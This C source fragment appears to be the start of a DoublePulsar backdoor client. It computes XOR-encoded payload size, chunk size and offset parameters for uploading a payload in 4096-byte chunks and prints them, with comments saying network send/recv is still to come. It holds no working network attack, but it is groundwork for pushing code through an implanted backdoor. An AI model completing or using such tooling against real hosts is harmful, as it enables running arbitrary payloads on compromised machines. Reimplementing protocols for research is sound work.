//Sources used: https://shasaurabh.blogspot.com/2017/05/doublepulsar-backdoor.html

/*
sample function to loop through imaginary buffer
this function seems to work
will update it with the real memory buffer & send / recv commands
*/

void loop_through_buffer()
{

//sample payload size
	unsigned int total_payload_size = 0x507308;

//sample XOR key
	unsigned int Key = 0x58581162;
  
  //encrypted parameters here
	unsigned int p_size = 0x507308 ^ Key; //total_payload_size here
	unsigned int c_size = 4096 ^ Key; //chunk size
	unsigned int o_offset = 0 ^ Key; //offset value, starts at 0

//buffer to hold our parameters
	char Parametersbuffer[12];

	int i;
  	int ctx = 0; //counter

	unsigned int v19 = int(total_payload_size);
	unsigned int v9 = v19 / 4096;
	unsigned int v10 = v19 % 4096;
	unsigned int bytesLeft = int(total_payload_size);

	printf("Iterations:  %d\n", v9);

	int loop_counter = 0;
	if (v19 / 4096 > 0)
	{
		for (ctx = 0; ctx < v19;)
		{
			if (bytesLeft < 4096)
			{
				break;
			}
			o_offset = ctx ^ Key; //update the offset ( +4096 ) every loop
      
      			//copy the new parameters
			memcpy(Parametersbuffer, (char*)&p_size, 4);
			memcpy(Parametersbuffer + 4, (char*)&c_size, 4);
			memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);

			printf("PARAMETERS: ");

			for (i = 0; i < 12; i++)
			{
				printf("0x%x ", Parametersbuffer[i]);
			}
			printf("\n");
      
      //update counter + 4096 bytes
			ctx += 4096;
      
      //decrease the bytesLeft variable by 4096
			bytesLeft -= 4096;
			printf("[LOOP COUNT %d]:  Bytes left:  %d\n", loop_counter, bytesLeft);
			loop_counter += 1;
		}
	}
	if (v10 > 0)
	{
		printf("Last packet!  Bytes Left = %d\n", bytesLeft);

					  //Normally the chunk size is 4096 but this is less
					//since there is only less than 4096 bytes left
		c_size = bytesLeft ^ Key; //update chunk size to the last bytes to upload
		o_offset = ctx ^ Key; //update offset counter to the latest value before the break
		
		//copy the new parameters over
		memcpy(Parametersbuffer, (char*)&p_size, 4);
		memcpy(Parametersbuffer + 4, (char*)&c_size, 4);
		memcpy(Parametersbuffer + 8, (char*)&o_offset, 4);

		printf("PARAMETERS: ");

		for (i = 0; i < 12; i++)
		{
			printf("0x%x ", Parametersbuffer[i]);
		}
	}
  
  //sample taken from the last packet and verifying that the value = correct expected value
  //this works :)
	unsigned int lastByte = 0x5858126a ^ 0x58581162;
	printf("\n Last bytes left:  0x%x\n", lastByte);
	printf("Last bytes left in integer:  %d\n", int(lastByte));
}
